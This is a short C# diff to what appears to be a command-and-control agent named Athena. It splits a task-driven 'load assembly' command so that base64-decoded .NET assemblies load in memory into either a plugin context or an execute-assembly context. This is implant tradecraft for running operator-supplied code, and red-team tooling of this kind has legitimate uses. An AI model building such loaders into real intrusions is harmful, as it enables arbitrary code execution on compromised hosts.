@@ -40,7 +40,24 @@ namespace Athena.Commands
             LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
             try
             {
-                this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.assembly)));
+                if(la.target == "plugin")
+                {
+                    this.commandContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.assembly)));
+                }
+                else if(la.target == "external")
+                {
+                    this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(la.assembly)));
+                }
+                else
+                {
+                    return new ResponseResult
+                    {
+                        task_id = job.task.id,
+                        user_output = "Invalid target specified",
+                        completed = "true",
+                        status = "error"
+                    };
+                }
                 //Return true if success
                 return new ResponseResult
                 {
@@ -48,6 +65,7 @@ namespace Athena.Commands
                     user_output = "Successfully loaded assembly",
                     completed = "true"
                 };
+
             }
             catch (Exception e)
             {
